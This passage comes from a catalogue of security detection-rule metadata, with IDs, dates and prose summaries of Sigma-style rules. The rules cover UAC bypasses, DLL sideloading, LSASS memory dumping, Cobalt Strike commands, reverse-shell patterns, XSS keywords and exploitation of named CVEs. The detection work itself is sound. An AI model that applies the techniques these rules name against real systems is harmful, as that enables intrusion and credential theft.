    obtain system privileges. It identifies instances where comctl32.dll is loaded
    from specific directories associated with system processes like logonUI.exe, werFault.exe,
    consent.exe, narrator.exe, and wermgr.exe. This technique can be used for defense
    evasion, persistence, and privilege escalation on Windows systems.
  Updated-Date: '2024_09_03'
63647769-326d-4dde-a419-b925cc0caf42:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f8dabc36cf58591dbcda6858f28dfb7
  Ruleset: sigmahq
  Summary: This rule detects the enabling of the Dynamic Data Exchange (DDE) protocol
    in all supported editions of Microsoft Word or Excel by monitoring specific registry
    settings. For Microsoft Word, it looks for changes to the `\Word\Security\AllowDDE`
    registry key set to `0x00000001` or `0x00000002`. For Microsoft Excel, it checks
    for the `\Excel\Security\DisableDDEServerLaunch` and `\Excel\Security\DisableDDEServerLookup`
    registry keys set to `0x00000000`. Enabling DDE may indicate potential security
    risks as it is a method that allows different applications to share data.
  Updated-Date: '2024_09_04'
636e30d5-3736-42ea-96b1-e6e2f8429fd6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d93935c968e21274ae289a66ec5a691
  Ruleset: sigmahq
  Summary: This rule detects when an owner is removed from an application or service
    principal in Azure. This activity could indicate potential malicious activity,
    such as defense evasion, and it is important to verify if the action was performed
    by a legitimate system administrator or an unfamiliar user. Familiar planned changes
    to ownership should be noted to avoid false positives.
  Updated-Date: '2024_09_04'
637f689e-b4a5-4a86-be0e-0100a0a33ba2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d844890e85f8d4d222c5f799ad2ae8ee
  Ruleset: sigmahq
  Summary: This rule detects the creation of a specific named pipe pattern that is
    associated with the hack tool EfsPotato. EfsPotato is known for leveraging named
    pipes for defense evasion and privilege escalation. The rule specifically looks
    for pipe names containing "\pipe\" and "\pipe\srvsvc" while excluding certain
    pipe names to reduce false positives. The logging for these events needs to be
    configured in Sysmon to capture relevant Event IDs (17 and 18). The rule aims
    to differentiate malicious pipe creations from benign ones, ensuring accurate
    detection of EfsPotato activities.
  Updated-Date: '2024_09_04'
6385697e-9f1b-40bd-8817-f4a91f40508e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dd02a88ae53b3daee6c0d4b3fe87afbd
  Ruleset: core
  Summary: This rule detects instances where PowerShell scripts use Base64 encoded
    "Invoke-" calls, encoded either in UTF-8 or UTF-16. It specifically identifies
    process creation events related to PowerShell by looking for executions from known
    PowerShell binaries and the presence of the " -e" flag in the command line, which
    indicates encoded commands. The rule further narrows down the detection by searching
    for specific Base64 encoded strings that translate to "Invoke-" in both UTF-16
    and UTF-8. This technique is often used for execution and defense evasion purposes
    by obfuscating the command content.
  Updated-Date: '2024_09_03'
639c9081-f482-47d3-a0bd-ddee3d4ecd76:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d992354317ca5261c86233030c62fc02
  Ruleset: core
  Summary: This rule detects the deletion of all backups or system state backups through
    the use of "wbadmin.exe". This method is frequently employed by various ransomware
    families and threat actors to disrupt recovery processes. The rule triggers mostly
    on server platforms where Windows Backup is enabled.
  Updated-Date: '2024_09_03'
63bf8794-9917-45bc-88dd-e1b5abc0ecfd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e84276eb2177634f1d8f475ed51c0593
  Ruleset: core
  Summary: This rule detects the use of PowerShell to install or copy a file into
    critical system directories such as "System32" or "SysWOW64." The activity involves
    specific PowerShell commands like `Copy-Item` or `cpi`, which move files to these
    directories. This behavior may indicate an attempt to install malicious software
    or perform unauthorized modifications to system files, potentially aiding in credential
    access, as noted in the provided reference. The detection relies on Script Block
    Logging to identify such suspicious actions.
  Updated-Date: '2024_09_03'
63c779ba-f638-40a0-a593-ddd45e8b1ddc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 48c7d7043a1c271e7abb120230a4686e
  Ruleset: sigmahq
  Summary: This rule detects the deletion of event log files in the Windows system
    directory, particularly those with an '.evtx' extension. Such activity may indicate
    an attempt to destroy forensic evidence, potentially corresponding to defense
    evasion techniques.
  Updated-Date: '2024_09_04'
63d1ccc0-2a43-4f4b-9289-361b308991ff:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8f8090f2cf71f48c0ae6644b46cff5a9
  Ruleset: core
  Summary: This rule detects unusual parent or child processes associated with the
    execution of `wab.exe` (Windows Contacts) and `Wabmig.exe` (Microsoft Address
    Book Import Tool). These processes have been observed in connection with malicious
    activity involving the Bumblebee malware. Unusual process relationships, such
    as having parents like `WmiPrvSE.exe`, `svchost.exe`, `dllhost.exe`, or spawning
    certain suspicious children like command-line interpreters, are flagged to identify
    potential threats and evade defenses. The context is focused on spotting anomalous
    process behavior linked to Bumblebee that could indicate malicious activities
    or attempts at persistence within a Windows environment.
  Updated-Date: '2024_09_03'
63e3365d-4824-42d8-8b82-e56810fefa0c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95085e4bdcd00ab78e09ce4ebd20b280
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell scripts through the use of Clip.exe,
    identified from system logs on Windows that report events from the Service Control
    Manager with Event ID 7045. The detection focuses on instances where the ImagePath
    property contains references to "Clipboard" or the character "i". This behavior
    is associated with defense evasion and execution tactics, as described by specific
    attack techniques.
  Updated-Date: '2024_09_03'
63e4f530-65dc-49cc-8f80-ccfa95c69d43:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 219ec3d2b7bf44101c69b7119f1c66e7
  Ruleset: core
  Summary: This rule detects a User Account Control (UAC) bypass technique that exploits
    the Windows Event Viewer. This method involves using specific patterns in filenames
    associated with Event Viewer to escalate privileges, a tactic often employed for
    defense evasion and privilege escalation. The detection is based on the presence
    of particular endpoints within the `TargetFilename` field while filtering out
    typical legitimate paths from `System32` and `SysWOW64` directories.
  Updated-Date: '2024_09_03'
63f3605b-979f-48c2-b7cc-7f90523fed88:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: acb97626113b7061a35a6c4017529c77
  Ruleset: emerging-threats
  Summary: This rule detects potential suspicious child processes spawned by "3CXDesktopApp.exe,"
    which may indicate a compromise related to the 3CXDesktopApp supply chain. Specifically,
    it monitors for child processes such as cmd.exe, cscript.exe, mshta.exe, powershell.exe,
    pwsh.exe, regsvr32.exe, rundll32.exe, and wscript.exe. This type of activity is
    indicative of known malicious tactics, techniques, and procedures associated with
    command-and-control and execution.
  Updated-Date: '2024_09_03'
640dc51c-7713-4faa-8a0e-e7c0d9d4654c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6de149d5d40caf7f78f09cfa9b35eb75
  Ruleset: emerging-threats
  Summary: This rule detects a DLL hijacking technique used by NOBELIUM in their FoggyWeb
    backdoor. The malicious activity involves loading a compromised version of the
    "version.dll" DLL in the Windows ADFS directory, which allows for persistent access
    and control within the targeted system.
  Updated-Date: '2024_09_03'
6414b5cd-b19d-447e-bb5e-9f03940b5784:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 030d1af783f06f72f497e5a2fa1791e5
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "dbghelp.dll" by monitoring
    for instances where the "dbghelp.dll" file is loaded outside of typical directory
    paths such as 'C:\Program Files', 'C:\Windows\System32', and similar trusted directories.
    The rule specifically filters out legitimate occurrences from known directories
    linked to software distributions and development environments, like Anaconda and
    Epic Games. The objective is to identify suspicious use cases indicative of potential
    defense evasion, persistence mechanisms, or privilege escalation, in alignment
    with certain attack techniques. False positives may include legitimate applications
    that load their unique versions of the DLL.
  Updated-Date: '2024_09_04'
6419afd1-3742-47a5-a7e6-b50386cd15f8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a74575b8c34adcc3448625e8021088fc
  Ruleset: sigmahq
  Summary: This rule detects the use of the chmod command targeting files within abnormal
    directory paths such as '/tmp/', '/.Library/', '/etc/', and '/opt/'. Such behavior
    may indicate malicious activity including unauthorized changes to file permissions,
    potentially associated with malware or unauthorized user actions. The monitoring
    of chmod operations in these directories helps identify defense evasion techniques.
  Updated-Date: '2024_09_04'
641a4bfb-c017-44f7-800c-2aee0184ce9b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f155b24dfba91422f14c9ce81d1326a4
  Ruleset: core
  Summary: This rule detects the use of the Rundll32 utility in conjunction with obfuscated
    PowerShell scripts, which is an indicator of potential malicious activity involving
    PowerShell commands that have been deliberately obfuscated to evade detection.
    It monitors for specific patterns in the 'ImagePath' that include strings such
    as '&&', 'rundll32', 'shell32.dll', 'shellexec_rundll', 'value', 'invoke', 'comspec',
    and 'iex'. The log source is the 'Service Control Manager' within the Windows
    system, specifically targeting Event ID 7045. This approach helps in identifying
    sophisticated evasion techniques where Rundll32 is misused to execute obfuscated
    PowerShell commands, often used by attackers to bypass security mechanisms and
    execute harmful code.
  Updated-Date: '2024_09_03'
643bdcac-8b82-49f4-9fd9-25a90b929f3b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fdc225c223e09e3772ed4ce3932ca8a6
  Ruleset: core
  Summary: This rule detects the execution of a renamed MegaSync.exe file, which has
    been exploited by various ransomware families such as Nefilim, Sodinokibi, Pysa,
    and Conti for malicious activities. It identifies instances where the original
    filename is 'megasync.exe' but is executed from locations not typically associated
    with the legitimate MegaSync software, ensuring that legitimate uses by administrators
    or illegal software integrations are filtered out.
  Updated-Date: '2024_09_03'
645fd80d-6c07-435b-9e06-7bc1b5656cba:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 62a7d79289d791a2772091ef88aa04ca
  Ruleset: core
  Summary: This rule detects when the same privilege role has multiple activations
    by the same user within Microsoft Azure's Privileged Identity Management service.
    This activity may indicate potential misuse or unauthorized access involving privileged
    roles, which could lead to persistence or privilege escalation attacks.
  Updated-Date: '2024_09_03'
646bc99f-6682-4b47-a73a-17b1b64c9d34:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d44c7f8c11e752994aeb67fa8ae5d260
  Ruleset: sigmahq
  Summary: This rule detects the execution of files using msdeploy.exe, a legitimate
    Microsoft tool often used for deploying web applications and services. The detection
    focuses on specific command line arguments associated with the tool, particularly
    those related to executing custom commands. These arguments include 'verb:sync',
    '-source:RunCommand', and '-dest:runCommand'. This activity can be indicative
    of misuse for defense evasion purposes, often aligning with known techniques used
    by threat actors.
  Updated-Date: '2024_09_04'
646ea171-dded-4578-8a4d-65e9822892e3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9d519056c1298227c9f602ee9e286418
  Ruleset: core
  Summary: This rule detects the use of the "comsvcs.dll" library to create a process
    memory dump via the "rundll32.exe" utility. It identifies multiple techniques,
    including the use of specific ordinal numbers and the MiniDumpWriteDump function.
    The detection process focuses on certain command line patterns containing references
    to "comsvcs," memory dump flags, and other relevant parameters. This activity
    is commonly associated with defense evasion and credential access tactics.
  Updated-Date: '2024_09_03'
64760eef-87f7-4ed3-93fd-655668ea9420:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 98e7908bc5d812d873266f1922cc82bf
  Ruleset: sigmahq
  Summary: This rule detects the use of "ScriptRunner.exe," a binary that can be exploited
    to execute scripts and bypass potential whitelisting measures. The detection mechanism
    focuses on identifying instances where the process image matches "ScriptRunner.exe"
    or the original file name is "ScriptRunner.exe," along with command lines containing
    the argument ' -appvscript '. ScriptRunner.exe can be misused for defense evasion
    and malicious execution, making its detection critical in environments where script
    execution policies are enforced.
  Updated-Date: '2024_09_04'
647c7b9e-d784-4fda-b9a0-45c565a7b729:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b3f892021135bbc734231b166aebff2d
  Ruleset: core
  Summary: This rule detects instances where Cobalt Strike commands are mistakenly
    entered into the Command Prompt (CMD) shell. Cobalt Strike is a penetration testing
    software often used by cybersecurity professionals and malicious actors to simulate
    and execute network attacks. The detection criteria focus on identifying CMD processes
    with command lines that invoke Cobalt Strike specific commands such as 'psinject',
    'spawnas', 'make_token', 'remote-exec', 'rev2self', 'dcsync', 'logonpasswords',
    'execute-assembly', and 'getsystem'. Identifying these commands in a CMD context
    suggests potential operator error or scripting issues that could indicate unauthorized
    activity.
  Updated-Date: '2024_09_03'
64827580-e4c3-4c64-97eb-c72325d45399:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0e18c669c937702863ef06a37cd7a57b
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a file named "WerFault.exe" in the WinSxS
    directory by a process that is not from a main system location, indicating potential
    SNAKE malware activity. SNAKE is a sophisticated cyberespionage malware used by
    threat actors for intelligence gathering, and its presence is critical to identify
    and mitigate. The rule excludes processes originating from legitimate system directories
    to minimize false positives.
  Updated-Date: '2024_09_03'
64a871dd-83f6-4e5f-80fc-5a7ca3a8a819:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 94e58cc8a043d74ae873e8f94406bf0d
  Ruleset: emerging-threats
  Summary: This rule detects the persistence activity of the Kapeka backdoor on Windows
    systems. Kapeka uses different methods to achieve persistence based on the user's
    privileges. If the Kapeka dropper operates with administrator or SYSTEM privileges,
    it creates a scheduled task named "Sens Api" using the schtasks command to run
    upon system startup. If the dropper operates without these privileges, it sets
    persistence through an autorun registry entry called "Sens Api" under HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    using the "reg add" command. In both methods, the created task or registry entry
    launches the backdoor's binary via rundll32, invoking the first export ordinal
    of the backdoor without any additional argument. This facilitates the continuous
    execution of the backdoor, ensuring it reactivates with system or user logins.
  Updated-Date: '2024_09_03'
64d51a51-32a6-49f0-9f3d-17e34d640272:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1408cb27ec96de919b29e9eceea1d926
  Ruleset: core
  Summary: This rule detects instances where ngrok, a reverse proxy tool, is used
    to forward events to the local Remote Desktop Protocol (RDP) port. This activity
    may indicate malicious behavior, as ngrok can expose internal services to external
    networks, potentially facilitating unauthorized remote access. Detecting EventID
    21 with addresses containing '16777216' can help identify these occurrences.
  Updated-Date: '2024_09_03'
64e8e417-c19a-475a-8d19-98ea705394cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9bef4d5c9011a3cfe4b402a1606894ee
  Ruleset: sigmahq
  Summary: This rule detects the use of alternate PowerShell hosts that may be employed
    to bypass security detections typically focused on powershell.exe. It targets
    the presence of certain context information indicating an execution environment
    related to PowerShell. The rule excludes common scenarios such as direct invocation
    of PowerShell from the command line, executions involving typical Windows system
    paths with various slash orientations, Microsoft Diagnostic Troubleshooting Wizard
    (sdiagnhost.exe), Citrix configuration synchronizations, Active Directory Administrative
    Center operations, Windows Remote Management (WinRM) host processes, and legitimate
    help updates. The objective is to identify suspicious patterns while minimizing
    false positives from benign use cases.
  Updated-Date: '2024_09_04'
65236ec7-ace0-4f0c-82fd-737b04fd4dcb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 510d0b7a053120ed959dbcc463aab3e0
  Ruleset: sigmahq
  Summary: This rule detects the creation of new files with the ".evtx" extension
    in uncommon or non-standard locations on a Windows system. The presence of such
    files in atypical directories may indicate attempts to tamper with default Event
    Log locations to evade security controls or to exfiltrate event logs in search
    of sensitive information. It is important to note that legitimate administrative
    or backup activities, as well as certain bugs related to the "svchost" process,
    might also result in similar file creation.
  Updated-Date: '2024_09_04'
652c098d-dc11-4ba6-8566-c20e89042f2b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 33635528bb13961af0ce40d7dc86440c
  Ruleset: sigmahq
  Summary: This rule detects attempts to create and add an account to the admin group
    using the "sysadminctl" utility on macOS systems. The detection is based on the
    observation of specific command line arguments associated with "sysadminctl,"
    specifically those intended to add a new user and grant them administrative privileges.
    Legitimate administration activities may trigger this detection as well.
  Updated-Date: '2024_09_04'
65354b83-a2ea-4ea6-8414-3ab38be0d409:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3d893f7f3c61b7218803d8e80ca93dbe
  Ruleset: core
  Summary: This rule detects attempts of Cross Site Scripting (XSS) through GET requests
    in web server access logs. It identifies suspicious keywords and patterns commonly
    associated with XSS, such as `<script>`, `<iframe>`, `<svg>`, and JavaScript functions
    like `document.cookie` and `alert`. The rule filters out false positives such
    as 404 status codes and scans for specific scripting tags that could be used to
    execute malicious code within a web page, which indicates a potential XSS attack.
    It gathers relevant data fields including the client IP, virtual host, URL, and
    server response to provide context for each detected attempt.
  Updated-Date: '2024_09_03'
654fcc6d-840d-4844-9b07-2c3300e54a26:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f81c8f5d5bea7bbd1b2c99ad3bf5a658
  Ruleset: core
  Summary: This rule detects programs on a Windows system that are not typically expected
    to create archive files such as .zip, .rar, .7z, .diagcab, or .appx, being used
    to perform such actions. This includes Microsoft Office applications like Word
    (winword.exe), Excel (excel.exe), and PowerPoint (powerpnt.exe), as well as utilities
    that can potentially download executables such as certutil.exe and certoc.exe.
    It also monitors executables that typically should not drop other executables
    to disk, like notepad.exe, AcroRd32.exe, and mshta.exe, which may indicate anomalous
    or malicious behavior if they are being used to write archives.
  Updated-Date: '2024_09_03'
6555754e-5e7f-4a67-ad1c-4041c413a007:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dca47e37b5ab01d975d8c039d668423c
  Ruleset: core
  Summary: This rule detects unusual characteristics in authentication tokens, such
    as an atypical token lifetime or tokens used from unfamiliar locations. These
    anomalies are flagged as potentially indicative of credential access attacks.
    The rule leverages Azure's risk detection service to identify such risk events.
  Updated-Date: '2024_09_03'
65744385-8541-44a6-8630-ffc824d7d4cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bcf5a10a4b0586589123118ef0f19408
  Ruleset: sigmahq
  Summary: This rule detects attempts by uncommon processes to access sensitive Microsoft
    Teams files, specifically leveldb and cookies, which may contain authentication
    tokens in cleartext. Unauthorized access to these files can lead to credential
    theft and compromise of Microsoft Teams accounts. This rule is designed to identify
    such suspicious file access activities to enhance security measures against potential
    breaches.
  Updated-Date: '2024_09_04'
6597be7b-ac61-4ac8-bef4-d3ec88174853:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: de613e4b0b396f2c5ebab70ed1c06ee5
  Ruleset: core
  Summary: This rule detects a User Account Control (UAC) bypass that exploits a path
    parsing vulnerability in winsat.exe, commonly associated with the UACMe tool (specifically
    technique 52). The detection focuses on specific registry modifications indicating
    the presence of a malicious winsat.exe path in the lower case long path of the
    registry. It looks for details that start with "c:\users\" and end with "\appdata\local\temp\system32\winsat.exe".
    This technique is employed to evade defenses and elevate privileges on Windows
    systems.
  Updated-Date: '2024_09_03'
65c0a0ab-d675-4441-bd6b-d3db226a2685:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1bc9d8754c6e331e1acbaa34040edc2c
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit a command injection vulnerability
    in Atlassian Bitbucket, specifically CVE-2022-36804. The activity is identified
    by monitoring web server logs for specific patterns in the request URI, such as
    references to the archive API and certain payloads like 'prefix=' and '%00--exec'.
    This detection can help identify malicious actors trying to gain unauthorized
    access or execute arbitrary commands on Bitbucket servers. False positives may
    include activity from web vulnerability scanners.
  Updated-Date: '2024_09_03'
65c3ca2c-525f-4ced-968e-246a713d164f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ef5f3c84fa881cf0bd782dcaa76d0b43
  Ruleset: sigmahq
  Summary: This rule detects the renamed execution of "Microsoft.NodejsTools.PressAnyKey.exe,"
    a file that can be abused as a Living Off the Land Binary (LOLBIN) to execute
    arbitrary binaries.
  Updated-Date: '2024_09_04'
65c6e3c1-fb28-4c03-a51e-84919d8185f1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4d83ba0ea2a7b480085d3c8ab2ec165f
  Ruleset: emerging-threats
  Summary: This rule detects registry value modifications characterized by specific
    intentional typos and strings indicative of the Small Sieve malware. The focus
    is on identifying entries in the registry path '\Microsoft\Windows\CurrentVersion\Run\'
    that contain the misspelling 'Microsift' and the string '.exe Platypus.' These
    markers are known to be associated with the persistence mechanism used by Small
    Sieve, a type of malware aimed at maintaining its presence on infected Windows
    systems.
  Updated-Date: '2024_09_03'
65d506d3-fcfe-4071-b4b2-bcefe721bbbb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f02cd7623c20e91d04a67bd72a6e69c5
  Ruleset: core
  Summary: This rule detects potential persistence activity on macOS by monitoring
    the usage of the PlistBuddy utility to manipulate LaunchAgents or LaunchDaemons.
    PlistBuddy is a command-line tool that can be used to manage property list files
    (.plist), which are often employed to configure startup items. The rule triggers
    when the utility is used with specific command-line arguments that indicate an
    attempt to set the 'RunAtLoad' key to 'true', suggesting the addition or modification
    of a persistent application or service.
  Updated-Date: '2024_09_03'
65f77b1e-8e79-45bf-bb67-5988a8ce45a5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e09a6b3adeca492ad0e1ae7eb511ad09
  Ruleset: core
  Summary: This rule detects remote RPC (Remote Procedure Call) calls used by SharpHound,
    a tool for gathering information about Active Directory environments. Specifically,
    it identifies RPC calls that map remote connections and local group membership,
    which can be indicative of reconnaissance activities.
  Updated-Date: '2024_09_03'
6640f31c-01ad-49b5-beb5-83498a5cd8bd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a4493b2197479574d9da44c126de5204
  Ruleset: core
  Summary: This rule detects the execution of `node.exe`, which is included in various
    software such as VMware and Adobe, used to run arbitrary code. This behavior can
    be indicative of malicious activities like establishing a reverse shell, common
    in attacks like Log4j. Specific indicators involve command-line arguments used
    for code evaluation or patterns associated with reverse shell creation, such as
    the use of `.exec(`, `net.socket`, `.connect`, and `child_process`.
  Updated-Date: '2024_09_03'
66474410-b883-415f-9f8d-75345a0a66a6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f9a2848cad9f053c2a9eb8a6b0a212e
  Ruleset: sigmahq
  Summary: This rule detects DNS queries for subdomains associated with the MEGA file-sharing
    website, which is often used for data exfiltration activities. Specifically, it
    monitors for DNS queries to 'userstorage.mega.co.nz' within the Windows DNS Client
    events. The presence of these queries could indicate either legitimate usage of
    the MEGA service or potential illicit data exfiltration activities.
  Updated-Date: '2024_09_04'
665e2d43-70dc-4ccc-9d27-026c9dd7ed9c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1cf6d3a068bf10a2ed97bb341f3bc730
  Ruleset: sigmahq
  Summary: This rule detects the removal of a user from a group that has access to
    modify Conditional Access (CA) policies. This monitoring is crucial for maintaining
    security as altering CA policies can impact defense strategies, persistence mechanisms,
    and elevate privileges improperly. The activity is logged in Azure audit logs
    and is vital for identifying unauthorized changes to group memberships that could
    indicate an attempt to evade defenses or modify access controls. False positives
    may occur if the removal is an approved action.
  Updated-Date: '2024_09_04'
6676896b-2cce-422d-82af-5a1abe65e241:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 90bcdec159af4071e305d8a24345afa7
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation activity associated with the Advanced
    Persistent Threat (APT) group FIN7 as reported by Google. FIN7 is known to obtain
    initial access by using compromised Remote Desktop Protocol (RDP) credentials
    to log in to a target server and initiate a specific sequence of Windows processes.
    The detection focuses on identifying instances where Notepad++ launches Command
    Prompt (cmd.exe) or when the RDP initialization process (rdpinit.exe) starts Notepad++.
  Updated-Date: '2024_09_03'
66a4d409-451b-4151-94f4-a55d559c49b0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 118872505cfed6d29db3cf3336456ec4
  Ruleset: sigmahq
  Summary: This rule detects the removal of a mounted share through PowerShell commands.
    Adversaries may use this tactic to clean up traces of their operation by disconnecting
    share connections that are no longer useful. The detection focuses on specific
    PowerShell commands such as "Remove-SmbShare" and "Remove-FileShare". While legitimate
    users such as administrators or power users might also remove shares via the command
    line, the rule aims to highlight potential defense evasion activities.
  Updated-Date: '2024_09_04'
66c3b204-9f88-4d0a-a7f7-8a57d521ca55:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 66ebf8abb0eee17a08b0a0ab07a2ee06
  Ruleset: core
  Summary: This rule detects the use of command line parameters or strings associated
    with crypto mining activity. It focuses on identifying specific patterns such
    as "--cpu-priority=", "--donate-level=0", "-o pool.", "--nicehash", and "stratum+tcp://"
    or "stratum+udp://", including their base64 encoded counterparts. The rule aims
    to catch potential crypto mining operations executed on Windows systems by observing
    these command line indicators. It includes filters to exclude certain non-malicious
    activities, such as legitimate uses of crypto miners and commands within some
    build frameworks.
  Updated-Date: '2024_09_03'
66d31e5f-52d6-40a4-9615-002d3789a119:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3fe80f8c77d3790f24694e9bbbf521fc
  Ruleset: sigmahq
  Summary: This rule detects uncommon processes creating remote threads in Windows
    systems, which may indicate privilege escalation or defense evasion attempts.
    Specific processes monitored include 'explorer.exe', 'iexplore.exe', 'msiexec.exe',
    'powerpnt.exe', 'schtasks.exe', and 'winlogon.exe'. Filters are applied to exclude
    benign activities, such as legitimate interactions with system processes ('services.exe',
    'wininit.exe', 'csrss.exe', 'LogonUI.exe') and routine operations by 'schtasks.exe'
    and 'explorer.exe'. Additional filters account for actions during MSI installations
    and typical behaviors within certain applications like CheckPoint's SmartConsole
    and Microsoft PowerPoint. The rule's effectiveness relies on establishing an environment-specific
    baseline to mitigate false positives.
  Updated-Date: '2024_09_04'
66e563f9-1cbd-4a22-a957-d8b7c0f44372:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a7644d50e1335eeaf8b81feffd2cbee0
  Ruleset: core
  Summary: This rule detects the execution of the XORDump process memory dumping utility,
    specifically monitoring for its suspicious use. XORDump is employed to dump the
    memory of processes, which can be exploited for malicious purposes such as extracting
    credentials from the LSASS process or other system-critical processes. The rule
    identifies instances where `xordump.exe` is executed with command line arguments
    targeting processes like `lsass.exe`, `comsvcs`, `dbghelp`, or `dbgcore`. This
    behavior is indicative of potential defense evasion and credential access attempts.
  Updated-Date: '2024_09_03'
6702b13c-e421-44cc-ab33-42cc25570f11:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7e51cd03da8bde8266cb653940f8edab
  Ruleset: emerging-threats
  Summary: This rule detects suspicious access to specific URLs associated with exploiting
    the ADSelfService vulnerability identified as CVE-2021-40539. The rule monitors
    web server logs for query strings related to paths like '/help/admin-guide/Reports/ReportGenerate.jsp',
    '/ServletApi/../RestApi/LogonCustomization', and '/ServletApi/../RestAPI/Connection'.
    Detecting these patterns in server logs indicates a potential exploitation attempt
    of the ADSelfService application vulnerability, which attackers might leverage
    to gain initial access to target systems. The detection level for this activity
    is set to high due to the critical nature of the exploit.
  Updated-Date: '2024_09_03'
671ffc77-50a7-464f-9e3d-9ea2b493b26b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 69e51d3a1231bc37ca3cffa4ffad678a
  Ruleset: sigmahq
  Summary: This rule detects modifications to Cisco configuration settings that can
    be utilized by adversaries to maintain persistence or achieve other malicious
    impacts. It focuses on specific keywords indicative of such modifications, including
    commands related to HTTP/HTTPS servers, kron policy lists, access lists, and related
    configurations. While legitimate administrators may execute these commands, their
    use can also signify unauthorized changes to the network configuration.
  Updated-Date: '2024_09_04'
674202d0-b22a-4af4-ae5f-2eda1f3da1af:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b946529922f64f195b830939f279f237
  Ruleset: core
  Summary: This rule detects attempts to bypass User Account Control (UAC) by utilizing
    Event Viewer through specific Windows Registry modifications. The technique involves
    altering registry entries related to the Event Viewer to execute commands with
    elevated privileges without triggering a UAC prompt. This behavior is indicative
    of unauthorized or malicious activity aimed at gaining persistent administrative
    access to a Windows system.
  Updated-Date: '2024_09_03'
6763c6c8-bd01-4687-bc8d-4fa52cf8ba08:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6f2fe822e24c1af296dbd7959d763d7e
  Ruleset: core
  Summary: This rule detects an attacker attempting to enable the Outlook security
    setting "EnableUnsafeClientMailRules," which allows Outlook to run applications
    or execute macros. The setting modification is identified through changes in the
